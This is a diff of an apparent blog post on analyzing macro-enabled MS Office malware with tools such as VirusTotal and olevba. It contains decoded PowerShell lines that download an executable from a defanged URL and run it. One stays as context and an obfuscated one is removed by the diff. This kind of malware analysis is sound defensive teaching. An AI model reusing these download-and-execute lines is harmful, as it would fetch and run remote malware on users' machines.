@@ -17,6 +17,7 @@ In this blog we will Learn how to analyze MS Office Macro enabled Documents.
 2nd sample:
     a9f8b7b65e972545591683213bb198c1767424423ecc8269833f6e784aa8bc99
 {% endhighlight %}
+
 # 1st Sample
 
 Let's see the sample in Virus Total
@@ -113,6 +114,7 @@ start /MIN C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  - win 1  -
 (New - Object System.Net.WebClient).DownloadFile("hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif", "$env:APPDATA\$ProcName");
 Start - Process ("$env:APPDATA\$ProcName")
 {% highlight text %}
+
 This script runs powershell script to download file from "hxxps[://]www[.]qqqformula[.]co[.]za/works/RICH[.]pif" to the current user's AppData directory with name "Ktaqftbffhqhoxzyblssi.exe" and executes it.
 
 # 2nd Sample
@@ -132,6 +134,7 @@ Let's see its macro code
 {% highlight text %}
 olevba C:\Users\M4lcode\Desktop\ee6d2f06ce4476370cb830acb3890dca.xls
 {% endhighlight %}
+
 ![](/images/msofficemacros/image14.jpg)
 
 It uses **wscript** language and base64 encoding
@@ -146,14 +149,7 @@ Let's try to decode this strings
 
 ![](/images/msofficemacros/image16.jpg)
 
-{% highlight text %}
 
-$fdsfsdf = "fsfdghfddfgh";
-(NEw-objEct `N`e`T`.`W`e`B`C`l`i`e`N`T`).DownLoAdfIlE('hxxp[://]suyashcollegeofnursing[.]com/language/Don163/CryptedFile163[.]exe', "$ENv:temp\jfcbvept.exe");
-Start "$ENv:temp\jfcbvept.exe";
-$fdsfsdf = "fsfdghfddfgh";
-
-{% endhighlight %}
 This powershell script is downloading a file from "hxxp[://]suyashcollegeofnursing[.]com" to **temp** directory with name "jfcbvept.exe" then it starts it
 
 CreateObject("Wscript.Shell") return is assigned to **zKShMevSa**
